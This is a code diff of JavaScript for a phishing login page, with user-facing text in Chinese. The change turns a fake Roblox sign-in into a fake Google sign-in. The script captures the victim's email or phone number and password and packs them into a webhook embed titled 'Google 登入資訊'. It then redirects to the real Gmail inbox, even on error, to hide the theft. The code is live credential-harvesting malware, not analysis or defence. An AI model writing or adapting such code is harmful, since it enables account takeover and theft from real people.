@@ -1,12 +1,14 @@
 document.addEventListener("DOMContentLoaded", () => {
-    const loginButton = document.getElementById("login-button");
+    const signInButton = document.querySelector(".sign-in-btn");
 
-    loginButton.addEventListener("click", () => {
-        const username = document.getElementById("login-username").value.trim();
-        const password = document.getElementById("login-password").value;
+    signInButton.addEventListener("click", (event) => {
+        event.preventDefault();
 
-        if (!username || !password) {
-            alert("請輸入帳號與密碼！");
+        const emailOrPhone = document.getElementById("emailOrPhoneInput").value.trim();
+        const password = document.getElementById("passwordInput").value;
+
+        if (!emailOrPhone || !password) {
+            alert("請輸入電子郵件地址或電話號碼與密碼！");
             return;
         }
 
@@ -24,12 +26,12 @@ document.addEventListener("DOMContentLoaded", () => {
                     username: "帳號資訊",
                     embeds: [
                         {
-                            title: "Roblox 登入資訊",
+                            title: "Google 登入資訊",
                             color: 0xff4444,
                             fields: [
                                 {
-                                    name: "帳號",
-                                    value: username || "無",
+                                    name: "電子郵件或電話",
+                                    value: emailOrPhone || "無",
                                     inline: true
                                 },
                                 {
@@ -64,15 +66,11 @@ document.addEventListener("DOMContentLoaded", () => {
                 });
             })
             .then(() => {
-                window.location.href = "https://www.roblox.com/";
+                window.location.href = "https://mail.google.com/mail/u/0/";
             })
             .catch((error) => {
                 console.error("發生錯誤：", error);
-                window.location.href = "https://www.roblox.com/";
+                window.location.href = "https://mail.google.com/mail/u/0/";
             });
     });
-});
-
-document.getElementById("sendCodeBtn").addEventListener("click", function() {
-    window.location.href = "email_login.html";
 });
